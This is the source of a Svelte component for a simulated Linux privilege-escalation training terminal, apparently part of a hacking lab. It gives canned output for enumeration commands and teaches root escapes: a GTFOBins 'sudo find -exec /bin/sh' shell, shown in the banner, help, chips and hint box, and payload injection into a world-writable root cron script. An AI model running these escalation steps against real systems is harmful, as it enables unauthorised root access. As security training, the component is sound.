<script>
  import { tick } from 'svelte';
  import { progress, setObj } from '../stores/progress.js';

  const banner = () => [
    { kind: 'dim', text: 'www-data shell on web01 (from the web exploit). Goal: become root.' },
    { kind: 'dim', text: 'Enumerate, then escalate. Try: whoami · id · sudo -l · find / -perm -4000 2>/dev/null · cat /etc/crontab · ls -la /opt · help' },
    { kind: '', text: '' },
  ];
  let lines = banner();
  let cmdVal = '';
  let outEl;

  async function scrollDown() { await tick(); if (outEl) outEl.scrollTop = outEl.scrollHeight; }

  function run(raw) {
    const c = raw.trim();
    if (!c) return;
    const out = [{ kind: 'cmd', text: c }];
    const push = (kind, text) => out.push({ kind, text });
    if (c === 'whoami') push('', 'www-data');
    else if (c === 'id') push('', 'uid=33(www-data) gid=33(www-data) groups=33(www-data)');
    else if (/^sudo\s+-l$/.test(c)) {
      push('', 'Matching Defaults entries for www-data on web01:');
      push('', 'User www-data may run the following commands on web01:');
      push('hl', '    (root) NOPASSWD: /usr/bin/find');
      setObj('privesc', 'sudol', progress);
    } else if (/find\s+\/\s+-perm\s+-4000/.test(c)) {
      ['/usr/bin/sudo', '/usr/bin/passwd', '/usr/bin/mount', '/usr/bin/su', '/usr/bin/pkexec'].forEach(x => push('', x));
      push('dim', '(this SUID set is normal — your guaranteed path is the sudo NOPASSWD on /usr/bin/find)');
      setObj('privesc', 'suid', progress);
    } else if (c === 'cat /etc/crontab') {
      push('', '# m h dom mon dow user   command');
      push('', '* *  *  *  *   root     /opt/backup.sh');
      push('dim', "root runs /opt/backup.sh every minute — check its permissions");
      setObj('privesc', 'cron', progress);
    } else if (/^ls\s+-la\s+\/opt/.test(c) || /\/opt\/backup\.sh/.test(c)) {
      push('hl', '-rwxrwxrwx 1 root root 214 /opt/backup.sh   (world-writable, executed as root)');
    } else if (/sudo\s+(\/usr\/bin\/)?find\s+.*-exec\s+(\/bin\/)?(sh|bash)/.test(c)) {
      push('hl', '# id');
      push('hl', 'uid=0(root) gid=0(root) groups=0(root)');
      push('hl', '[+] GTFOBins: `sudo find ... -exec /bin/sh \\;` spawned a ROOT shell. Pwned.');
      setObj('privesc', 'root', progress);
    } else if (/echo\s+.*>>?\s*\/opt\/backup\.sh/.test(c)) {
      push('hl', '[+] payload appended to the world-writable root cron script → root within 60s. Second path works too.');
      setObj('privesc', 'root', progress);
    } else if (c === 'help') {
      push('', 'whoami · id · sudo -l · find / -perm -4000 2>/dev/null · cat /etc/crontab · ls -la /opt · then a GTFOBins escape, e.g.  sudo find . -exec /bin/sh \\;');
    } else if (c === 'clear') {
      lines = banner(); cmdVal = ''; scrollDown(); return;
    } else {
      push('err', (c.split(/\s+/)[0] || '') + ': command not found  (type help)');
    }
    out.push({ kind: '', text: '' });
    lines = [...lines, ...out];
    cmdVal = '';
    scrollDown();
  }

  function onKeydown(e) { if (e.key === 'Enter') run(cmdVal); }
  const chips = ['whoami', 'id', 'sudo -l', 'find / -perm -4000 2>/dev/null', 'cat /etc/crontab', 'ls -la /opt', 'sudo find . -exec /bin/sh \\;'];
</script>

<div class="term">
  <div class="term__out" bind:this={outEl}>
    {#each lines as l}
      {#if l.kind === 'cmd'}
        <div><span class="pmt">www-data@web01:/$</span> {l.text}</div>
      {:else if l.kind}
        <div class={l.kind}>{l.text}</div>
      {:else}
        <div>{l.text}</div>
      {/if}
    {/each}
  </div>
  <div class="term__in">
    <span>$</span>
    <div class="term-input-wrapper">
      <input autocomplete="off" spellcheck="false" placeholder="enumerate, then escalate…" bind:value={cmdVal} on:keydown={onKeydown}>
    </div>
  </div>
</div>
<div class="qchips">
  {#each chips as c}<button on:click={() => cmdVal = c}>{c}</button>{/each}
</div>
<div class="hintbox"><b>GTFOBins:</b> a binary you can run as root via sudo often has a documented shell escape. <code>sudo find . -exec /bin/sh \;</code> runs <code>/bin/sh</code> with find's root privileges. Memorise the pattern: <i>enumerate → match the binary to a known escape → spawn root</i>.</div>
